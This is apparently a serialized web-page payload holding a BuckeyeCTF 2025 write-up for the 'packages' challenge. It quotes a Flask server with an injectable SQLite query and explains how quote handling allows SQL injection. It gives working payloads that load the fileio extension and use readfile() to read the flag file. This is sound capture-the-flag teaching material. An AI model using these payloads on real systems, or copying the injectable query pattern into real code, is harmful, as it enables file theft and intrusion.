@@ -1,0 +1,118 @@
+1:"$Sreact.fragment"
+2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/116d3b69f07f8eb7.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
+1d:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
+1e:"$Sreact.suspense"
+:HL["https://gist.github.com/user-attachments/assets/2608bd98-1ec8-43f4-8a5a-bbe3e6cfd080","image"]
+3:T9d2,import sqlite3
+import json
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+
+db = sqlite3.connect("packages.db", check_same_thread=False)
+db.enable_load_extension(True)
+db.row_factory = sqlite3.Row
+
+TEMPLATE = """
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Package Search</title>
+    <style>
+        body { font-family: sans-serif; max-width: 800px; margin: 2rem auto; }
+        form { margin-bottom: 1rem; }
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid #ccc; padding: 0.5rem; text-align: left; }
+        th { background: #f4f4f4; }
+    </style>
+</head>
+<body>
+    <h1>Package Search</h1>
+    <form method="get">
+        <label>Distro:
+            <input name="distro" value="{{ request.args.get('distro', '') }}">
+        </label>
+        <label>Package:
+            <input name="package" value="{{ request.args.get('package', '') }}">
+        </label>
+        <button type="submit">Search</button>
+    </form>
+
+    {% if results %}
+        <h2>Showing {{ results|length }} result{{ 's' if results|length != 1 else '' }}</h2>
+        <table>
+            <tr>
+                <th>Distro</th>
+                <th>Distro Version</th>
+                <th>Package</th>
+                <th>Package Version</th>
+            </tr>
+            {% for row in results %}
+                <tr>
+                    <td>{{ row['distro'] }}</td>
+                    <td>{{ row['distro_version'] }}</td>
+                    <td>{{ row['package'] }}</td>
+                    <td>{{ row['package_version'] }}</td>
+                </tr>
+            {% endfor %}
+        </table>
+    {% else %}
+        <p>No results found.</p>
+    {% endif %}
+</body>
+</html>
+"""
+
+
+@app.route("/", methods=["GET"])
+def index():
+    distro = request.args.get("distro", "").strip().lower()
+    package = request.args.get("package", "").strip().lower()
+
+    sql = "SELECT distro, distro_version, package, package_version FROM packages"
+    if distro or package:
+        sql += " WHERE "
+    if distro:
+        sql += f"LOWER(distro) = {json.dumps(distro)}"
+    if distro and package:
+        sql += " AND "
+    if package:
+        sql += f"LOWER(package) = {json.dumps(package)}"
+    sql += " ORDER BY distro, distro_version, package"
+
+    print(sql)
+    results = db.execute(sql).fetchall()
+
+    return render_template_string(TEMPLATE, request=request, results=results)
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8000)0:{"buildId":"nzr612sclu2BoN_LPDlHC","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"BuckeyeCTF 2025 — packages"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"Explore the world of debian/debian-based packages."}],"\n",["$","p","p-1",{"children":["$","a","a-0",{"href":"https://packages.challs.pwnoh.io","children":"https://packages.challs.pwnoh.io"}]}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a Python server that looks like this:"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"$3","language":"py"}],"\n","$L4","\n","$L5","\n","$L6","\n","$L7","\n","$L8","\n","$L9","\n","$La","\n","$Lb","\n","$Lc","\n","$Ld","\n","$Le","\n","$Lf","\n","$L10","\n","$L11","\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17"]}]}],["$L18","$L19","$L1a","$L1b"],"$L1c"]}],"loading":null,"isPartial":false}
+4:["$","p","p-1",{"children":["We can see that even though ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"json.dumps()"}]," surrounds our query in quotes, we can still easily get SQL injection by putting quotes in our query ourselves: a ",["$","code","code-1",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"distro"}]," of"]}]
+5:["$","$L2","pre-1",{"className":"my-2","children":"\"OR 1=1;--","language":"sql"}]
+6:["$","p","p-2",{"children":"results in the following SQL query"}]
+7:["$","$L2","pre-2",{"className":"my-2","children":"SELECT distro, distro_version, package, package_version FROM packages WHERE LOWER(distro) = \"\\\"OR 1=1;--\"","language":"sql"}]
+8:["$","p","p-3",{"children":["and even though ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"json.dumps()"}]," escapes our inner quote with a backslash, ",["$","a","a-0",{"href":"https://www.sqlite.org/lang_expr.html#literal_values_constants_","children":"backslash escapes are not supported in SQLite"}]," and the ",["$","code","code-1",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"\\"}]," is treated as a plain character."]}]
+9:["$","p","p-4",{"children":"Another thing to notice is"}]
+a:["$","$L2","pre-3",{"className":"my-2","children":"db.enable_load_extension(True)","language":"py"}]
+b:["$","p","p-5",{"children":["which ",["$","a","a-0",{"href":"https://docs.python.org/3/library/sqlite3.html#sqlite3.Connection.enable_load_extension","children":["enables the SQLite ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"load_extension()"}]," function"]}]," for loading ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":".so"}]," extension files."]}]
+c:["$","p","p-6",{"children":"Looking at the Dockerfile,"}]
+d:["$","$L2","pre-4",{"className":"my-2","children":"FROM ghcr.io/astral-sh/uv:debian\n\nRUN wget https://sqlite.org/src/tarball/sqlite.tar.gz?r=release -O sqlite.tar.gz\nRUN tar xf sqlite.tar.gz\nWORKDIR /sqlite\nRUN ./configure\nRUN make -j$(nproc)\nWORKDIR /sqlite/ext/misc\nRUN for f in *; do gcc -g -fPIC -shared $f -o \"${f%.c}.so\"; done\n\nADD main.py pyproject.toml uv.lock seed.sql flag.txt /app/\nWORKDIR /app/\nRUN /sqlite/sqlite3 packages.db < seed.sql\nRUN uv sync --locked\nUSER 1000\nENV PYTHONUNBUFFERED=1\nCMD .venv/bin/python3 main.py","language":"dockerfile"}]
+e:["$","p","p-7",{"children":["they've conveniently compiled all extensions in ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"sqlite/ext/misc"}]," to ",["$","code","code-1",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":".so"}]," files, and we can load them at will with"]}]
+f:["$","$L2","pre-5",{"className":"my-2","children":"SELECT load_extension('/sqlite/ext/misc/{...}.so');","language":"sql"}]
+10:["$","p","p-8",{"children":["So which of ",["$","a","a-0",{"href":"https://github.com/sqlite/sqlite/tree/master/ext/misc","children":"these extensions"}]," seem helpful? Conveniently, ",["$","a","a-1",{"href":"https://github.com/sqlite/sqlite/blob/master/ext/misc/fileio.c","children":["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"fileio"}]}]," defines ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"readfile()"}]," and ",["$","code","code-1",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"writefile()"}]," functions for SQL:"]}]
+11:["$","$L2","pre-6",{"className":"my-2","children":"/*\n** 2014-06-13\n**\n** The author disclaims copyright to this source code.  In place of\n** a legal notice, here is a blessing:\n**\n**    May you do good and not evil.\n**    May you find forgiveness for yourself and forgive others.\n**    May you share freely, never taking more than you give.\n**\n******************************************************************************\n**\n** This SQLite extension implements SQL functions readfile() and\n** writefile(), and eponymous virtual type \"fsdir\".\n**\n** ...\n**\n** READFILE(FILE):\n**\n**   Read and return the contents of file FILE (type blob) from disk.\n**\n** ...\n*/","language":"c"}]
+12:["$","p","p-9",{"children":"Thus, we can simply query"}]
+13:["$","$L2","pre-7",{"className":"my-2","children":"\"OR 1=1 UNION SELECT load_extension('/sqlite/ext/misc/fileio.so'), 1, 1, 1;--","language":"sql"}]
+14:["$","p","p-10",{"children":["to load the ",["$","code","code-0",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"fileio"}]," extension (we need ",["$","code","code-1",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"UNION SELECT"}]," since we are tacking this onto the end of an existing query, and ",["$","code","code-2",{"className":"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"UNION SELECT"}]," requires both sides of the query to have the same number of columns), and"]}]
+15:["$","$L2","pre-8",{"className":"my-2","children":"\"OR 1=1 UNION SELECT readfile('/app/flag.txt'), 1, 1, 1 from packages;--","language":"sql"}]
+16:["$","p","p-11",{"children":"to read the flag:"}]
+17:["$","p","p-12",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/2608bd98-1ec8-43f4-8a5a-bbe3e6cfd080","alt":"img"}]}]
+18:["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}]
+19:["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}]
+1a:["$","script","script-2",{"src":"/_next/static/chunks/116d3b69f07f8eb7.js","async":true}]
+1b:["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]
+1c:["$","$L1d",null,{"children":["$","$1e",null,{"name":"Next.MetadataOutlet","children":"$@1f"}]}]
+1f:null
